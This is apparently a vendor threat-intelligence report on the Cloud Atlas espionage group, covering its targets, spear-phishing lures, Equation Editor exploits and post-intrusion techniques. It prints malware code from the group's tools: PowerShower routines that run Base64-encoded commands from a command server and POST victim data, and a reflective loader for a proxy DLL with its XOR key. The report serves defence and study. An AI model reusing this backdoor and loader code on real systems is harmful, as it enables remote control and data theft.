Since its discovery in 2014, they](https://securelist.com/recent-cloud-atlas-activity/92016/)**\nhave launched multiple, highly targeted attacks on critical infrastructure across geographical\nzones and political conflicts. The group’s tactics, techniques and procedures (TTPs) have\nremained relatively static over the years. However, since the rapid escalation of the conflict\nbetween Russia and Ukraine in 2021 and especially after the outbreak of war in February\n2022, the scope of the group’s activities has narrowed significantly, with a clear focus on\nRussia, Belarus and conflicted areas in Ukraine and Moldova. Some evidence discovered\nwhile monitoring the group’s latest activities indicates that the group carried out a few\nsuccessful intrusions and managed to gain full access to some of the targeted environments.\n\nIn this publication, we discuss the tools, TTPs and victimology of Cloud Atlas in the last year.\nInterestingly, in addition to the usual malware used by Cloud Atlas, we discovered a new,\npreviously never discussed tool: the group installs not only their signature modular\nespionage framework on the infected systems, but also uses the DLL to proxy connections\nthrough the victims’ machines.\n\n_While we finalized this blogpost, another_ _[technical analysis of Cloud Atlas activity was](https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/apt-cloud-atlas-unbroken-threat/)_\n_published. While it overlaps with our findings to some extent, we believe that this report_\n_provides the additional information, insights and clarifications regarding the actors’_\n_operations._\n\n## Victimology\n\nThe group’s victims shift with the escalation of the political situation around Ukraine. In\n2020-2021 the targets we observed included a wide range of ministries, diplomatic entities\nand industrial targets across the globe, including Western and Southeast Asia and Europe\n(especially, but not only Eastern Europe). However, toward the end of 2021, amid the rising\ntensions between Russia and Ukraine, the focus of the group shifted to the Crimean\nPeninsula and breakaway regions of Ukraine, Luhansk and Donetsk, as well as government,\ndiplomatic, research and industry entities of Russia and Belarus.\n\nIn March-April 2022, Cloud Atlas was observed targeting entities in the pro-Russian\nTransnistria breakaway region of Moldova, officially known as the Transnistrian Moldavian\nRepublic, where tensions were escalating amid fears that Russia would try to extend its\n\n\n-----\n\nsovereignty to Transnistria or use the republic s territories for an offensive against Ukraine.\nSince June 2022, we have seen multiple persistent campaigns focused on very specific targets\nin Belarus, mainly in its transportation and military radio-electronics sectors, and in Russia,\nincluding the government sector, energy and metal industries. The actors are also\nmaintaining their focus on the Russian-annexed Crimean Peninsula, Lugansk and Donetsk\nregions.\n\n## Initial infection\n\nCloud Atlas has used spear-phishing emails containing malicious attachments as their initial\n[attack vector for many years. They mostly use public email services like Yandex, Mail.ru and](http://mail.ru/)\n[Outlook.com, but in some cases also attempted to spoof the existing domains of other entities](http://outlook.com/)\nthat are likely to be trusted by the target.\n\n**_Figure 1 – Example of spear-phishing email (subject: “The Diplomatic_**\n**_Academy of the Ministry of Foreign Affairs, Diplomatic Service and Practice_**\n**_Journal”) sent by Cloud Atlas to one of the Russian ministries._**\n\nThe email attachment is usually a Microsoft Office document which retrieves a malicious\nremote template from the attackers’ servers. The lures of these documents are carefully\ntailored to the target. We observed a variety of weaponized documents ranging from\ngovernmental documents to publicly available reports and articles, including business\nproposals and advertisements.\n\n\n-----\n\n**_Figure 2 – Examples of lure documents targeting Belarussian entities: A_**\n**_description of the “Comprehensive analysis of the economic and financial_**\n**_activities of a commercial organization” course from Belarusian State_**\n**_Economic University (left) and the advertisement of the company specialized_**\n**_in office equipment (right)._**\n\n\n-----\n\n**_Figure 3 – Examples of lure documents used by CloudAtlas against_**\n**_government and energy sectors. (Resolution of the government of the Russian_**\n**_Federation on the application of legislation in the field of atomic energy in the_**\n**_Zaporozhye region, on the right.)_**\n\nThe remote templates are RTF documents that exploit 5-year-old vulnerabilities in Microsoft\nEquation Editor, such as CVE-2017-11882 and CVE-2018-0802. For both external templates\nand the later stages of the campaign, the attackers closely control who can access them by\n[whitelisting the targets. This is a known technique used by Cloud Atlas to collect the IP](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/inception-framework-hiding-behind-proxies)\ninformation of the victims by first sending them reconnaissance documents, which do not\ncontain any malicious functionality aside from fingerprinting the victim. Whitelisting can be\neasily performed in those cases where the targeted entities are large enough to have their\nown ASN. The use of whitelisting significantly decreases the chances of the malicious\ncomponents executing in sandboxes or research environments.\n\n## PowerShower backdoor\n\nThe next stage of a Cloud Atlas attack is usually a PowerShell-based backdoor called\nPowerShower. PowerShower is stored on the disk with simple obfuscation of Base64encoding and string concatenation:\n\n**_Figure 4 – Example of PowerShower backdoor obfuscation._**\n\nThe PowerShower versions that we observed during our research included a thinner\nfunctionality compared to older versions, but the backdoor remained essentially unchanged,\nincluding function names, such as `HttpRequestG,` `HttpRequestP, and` `dec64 that can`\nbe tracked through the different versions.\n\nOnce PowerShower is up and running, it mainly waits for further instructions from the\nCommand and Control (C&C) server. It may save a zip file sent from the server to\n```\n%TEMP%\\PG.zip or execute PowerShell commands that are sent embedded in an XML file\n\n```\nin a Base64-encoded format:\n\n$xmlfile = (gi $env:temp).fullname + \"\\\\temp.xml\";\n\n\n-----\n\n[io.file]::WriteAllBytes($xmlfile, $result);\n\n$content = Get-Content $xmlfile;\n\n[xml]$doc = $content;\n\n$command = dec64($doc.model.ps);\n\nInvoke-Expression $command;\n\nRemove-Item $xmlfile -force;\n\n**_Figure 5 – PowerShower piece of code that handles parsing XML and_**\n**_PowerShell command execution._**\n\nOne of the recent changes introduced in PowerShower is proxy awareness: if a proxy is\nenabled on the infected machine, the malware uses it when issuing the requests to the C&C\nserver. In addition, the script now sends some basic data about the victim’s machine (OS\nmajor and minor versions and PowerShell version) in the User-Agent header of the POST\nrequest:\n\nFunction HttpRequestP($url)\n\n{\n\n$all=\"\";\n\n$p_t = (gi $env:temp).fullname + \"\\pass.txt\";\n\n$content = [io.file]::ReadAllText($p_t);\n\nRemove-Item $p_t -force -recurse;\n\n$all=$content;\n\n$http_request = New-Object -ComObject Msxml2.ServerXMLHTTP.6.0;\n\n$http_request.open(\"POST\", $url, $false);\n\n$http_request.setOption(2,$http_request.getOption(2));\n\n$pr = Get-ItemProperty -Path\n\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\";\n\nif ( $pr.ProxyEnable -eq \"1\")\n\n{\n\n\n-----\n\n$http_request.setProxy(2, $pr.ProxyServer);\n\n}\n\n$psv = $PSVersionTable.PSVersion.Major;\n\n$wvmajor = [Environment]::OSVersion.Version.Major;\n\n$wvminor = [Environment]::OSVersion.Version.Minor;\n\n$http_request.SetRequestHeader(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 7.0;\nWindows NT \" + $wvmajor + \".\" + $wvminor + \"; PS \" + $psv + \".00)\");\n\n$http_request.send(\"$all\");\n\nreturn $http_request.status;\n\n}\n\n**_Figure 6 – PowerShower proxy handling and User-Agent string_**\n**_concatenation._**\n\n## RtcpProxy Tool\n\nOne of the interesting payloads received by PowerShower is a script called office.ps1 .\nThis script reflectively loads in memory and runs the `StartMainXor function from the`\n.NET DLL stored in the script compressed and Base64-encoded.\n\n$dll_compressed_base64=\"H4sIAAAAAAA<truncated>\"\n\n$dll_compressed=[System.Convert]::FromBase64String($dll_compressed_base64)\n\n$ms=New-ObjectSystem.IO.MemoryStream(,$dll_compressed)\n\n$cs=New-ObjectSystem.IO.Compression.GzipStream($ms,\n\n[IO.Compression.CompressionMode]::Decompress)\n\n$br=New-ObjectSystem.IO.BinaryReader($cs)\n\n$dll_content=$br.ReadBytes(10485760)\n\n$br.Close()\n\n$cs.Close()\n\n$ms.Close()\n\n\n-----\n\n[System.Reflection.Assembly]::Load($dll_content)\n\n#$content_bytes=[tcp_ssl_simple.NetTcpSsl]::StartHello()\n\n#[abcd.Service]::StartHello()\n\n// Prototype:\n\n// StartMainXor(string host, string port, int number, int reconnect_sleep, int\ntime_stop_delay_seconds, string hexkey)\n\n$content_bytes=[abcd.Service]::StartMainXor(\"<server_address>\", \"11171\", 10, 7000, 15 *\n60, \"010203BADC0DEF\")\n\nwrite-host\"DoneTest\"\n\nThis DLL is internally called `rtcpsvc.dll and is responsible for relaying commands`\nbetween two different servers. This DLL is likely a part of a sequence of proxies used by the\n[attackers. There were multiple past reports that the actors heavily relied on a world-wide](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/inception-framework-hiding-behind-proxies)\nproxy network, however, it was never mentioned that they achieved this with DLLs on\nWindows. Setting proxies within compromised environments might also in some cases allow\nthe actors to penetrate high profile targets while reducing the risk of their network activity\nbeing discovered or blocked, as the network activity is associated with trusted sources inside\nthe country or industry.\n\nThe communication between the DLL and the hosts can be XOR-encrypted, depending on if\nthe DLL was executed with a key parameter or without. In all the cases we analyzed, the\nsame key “ 010203BADC0DEF ” was used for the XOR-encryption. Other parameters that are\nprovided to launch the DLL include the host and port of the remote peer, the number of\nconnections, and the amount of time to sleep before reconnecting.\n\n\n-----\n\n**_Figure 7 – Overview of the Communication class responsible for_**\n**_communication between two peers._**\n\nThe DLL reaches out to the specified remote host ( Left ) and receives 4 bytes in response.\nThese bytes specify the length of the next message (command) to be received. It then\nconnects again to the host and expects an XML response with the `connect command. This`\nXML response should contain the `host and` `port of another ( Right ) peer. The DLL`\nconnects to the second host as well, notifies the first host of success, and starts to relay\nmessages between them.\n\n\n-----\n\n**_Figure 8 – Function responsible for sending the connect result in XML format_**\n**_to the “Left” peer._**\n\nSimilar to the command execution status sent to the peers, the relayed messages themselves\nare also in XML format, as well as the commands received by the PowerShower backdoor.\n\n## Modular espionage framework\n\nInterestingly, the actors made no significant changes in the core of their modular backdoor in\n[the seven years after its discovery in 2014 by Kaspersky and Symantec. As described in the](https://securelist.com/cloud-atlas-redoctober-apt-is-back-in-style/68083/)\naforementioned reports, we observed multiple samples of Cloud Atlas’ modular backdoor.\nEach is an obfuscated DLL accompanied by an encrypted file, with both DLL and data files\nnamed using random words. For example, a DLL named `beachmaster.dll was`\naccompanied by an encrypted file named `examinere . Each DLL has multiple randomly-`\nnamed export functions, only one of which is relevant. When the relevant export function is\ncalled, the DLL begins to decrypt and load an embedded PE file. The loaded PE file then\nXOR-decrypts a hardcoded struct that instructs it how to decrypt the companion file. For\nexample, the hardcoded struct in the PE inside `beachmaster.dll will look like this:`\n\n0000h: C6 8E CA BF E5 DE 8E 74 1E 08 E3 FB 6D C1 79 3F ÆŽÊ¿åÞŽt..ãûmÁy?\n\n0010h: E5 19 69 0C 55 74 54 F7 CF 15 9D AF 00 02 D9 55 å.i.UtT÷Ï.¯..ÙU�\n\n0020h: 47 00 6C 00 6F 00 62 00 61 00 6C 00 5C 00 49 00 G.l.o.b.a.l.\\.I.\n\n0030h: 54 00 4F 00 4A 00 75 00 43 00 65 00 69 00 00 00 T.O.J.u.C.e.i...\n\n0040h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n[…truncated…]\n\n\n-----\n\n0090h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n00A0h: 65 00 78 00 61 00 6D 00 69 00 6E 00 65 00 72 00 e.x.a.m.i.n.e.r.\n\n00B0h: 65 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e...............\n\n00C0h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n[…truncated…]\n\n0110h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................\n\n0120h: 7D CB BE 31 61 A3 10 54 8F D7 31 71 5E E7 21 86 }Ë¾1a£.T×1q^ç!†�\n\n0130h: 13 E1 CF 96 .áÏ–\n\n....\n\nThe structure is built from an AES256 key which is used to decrypt the companion file, an\nevent name which prevents running multiple instances of malware, a file name of the\nencrypted companion file, and a SHA1 hash. The SHA1 at the end of the structure is used for\na hash check: it matches the calculated SHA1 hash of the first 0x120 bytes of the\nconfiguration.\n\nThe payload then decrypts the companion file. It uses the AES256 key from the config, and\nthe last 16 bytes from the companion file as an IV. It then uses LZNT1 to decompress the\nresults and reveal another PE file. The newly revealed DLL also has an encrypted\nconfiguration hardcoded inside. Its decryption process is similar to those seen in previous\nstages and this config provides information that instructs the malware how to communicate\nwith its C&C server.\n\nThe malware still lives up to its “cloud name” origins and uses cloud storage providers to\ncommunicate via WebDAV protocol. In the samples we observed, Cloud Atlas used\n**OpenDrive as its service of choice. The credentials for OpenDrive are hardcoded in the**\nencrypted configuration, along with two URIs (one for uploading files from the victim, one\nfor downloading files from the server) and the pattern and extensions to generate the names\nof the uploaded files. The data sent to the service, such as information about the environment\nof the victim, is saved as files under the URI specified in the configuration. Additionally, the\npayload connects to another URI to receive the next payload, and when it downloads the next\npayload, it issues a request to the server to remove the downloaded file. The first module\nwhich is sent automatically is the stealer module, which is responsible for collecting the login\nand cookie data from multiple browsers on the victim’s machine.\n\n## Incident response report\n\n\n-----\n\nWhile investigating CloudAtlas activity, we stumbled upon some type of incident response\n[report written in Russian that was uploaded to VirusTotal from an IP address located in](https://www.virustotal.com/gui/file/de451b92ba4739020809541d27b2106b6e2ef5fb960c6288a56479fb9813d985)\nDonetsk. This report (no TLP label specified) provides an analysis of a few successful\nintrusions that occurred in June. These intrusions were discovered only in the later stages\nwhen the attackers already had full access to the entire network including the domain\ncontroller. Although not all the information in the report is precise and well-detailed, we can\ncautiously extract some of the group’s additional TTPs during the later stages of the attack:\n\nAfter gaining access to the domain controller, the actors extract the snapshot of its\ndatabase using the ntdsutil utility and copy it to their server for offline analysis and\nextraction of password hashes.\nTo connect to the machines inside the victim organization’s network, the attackers use\nthe infected computers of ordinary users, from which they then connect via RDP to the\ndomain controller. The attackers use existing domain accounts after changing their\npermissions or create accounts with similar names by changing one or two letters. The\nactors conduct their primary activities (using RDP or ssh to other servers, endpoints or\nnetwork equipment) from the domain controller, impersonating regular sysadmin\noperations.\nAdditional tools used by the attackers include Advanced Port Scanner (version\n2.5.3869, with Russian interface), file manager Far, Chocolatey, AnyDesk, and\n**Putty (copied to the servers and deleted after completing the task). The actors also use**\nPython 3 scripts on multiple servers to perform a variety of operations such as:\nsearching and deleting all information about connections to `webdav.opendrive.com`\nfrom the logs of the Squid proxy server; copying correspondence from Telegram clients,\nsaved passwords and browser history; and brute force of Microtik routers.\n\nIt is not clear from the report which organizations or entities were the victims of these\nattacks.\n\n## Conclusion\n\nCloud Atlas continuously and persistently targets entities of interest. With the escalation of\nthe conflict between Russia and Ukraine, their focus for the past year has been on Russia and\nBelarus and their diplomatic, government, energy and technology sectors, and on the\nannexed regions of Ukraine.\n\nCloud Atlas continues to use the simple but effective method of social engineering, using\nspear-phishing emails to compromise their targets. In the first stage of the attack, the actors\nuse Word documents with remote templates, usually whitelisted for a particular target, which\nmakes the phishing documents almost undetectable. Judging by the fact that the group\ncontinues to be very active despite only minor changes in TTPs, their methods seem to be\nsuccessful. Not only do they manage to penetrate their targets and expand their initial access\nto the entire domain, but they can also use them as proxies for other operations.\n\n\n-----\n\n_[Harmony Email & Office deploys between the inbox and its native security.
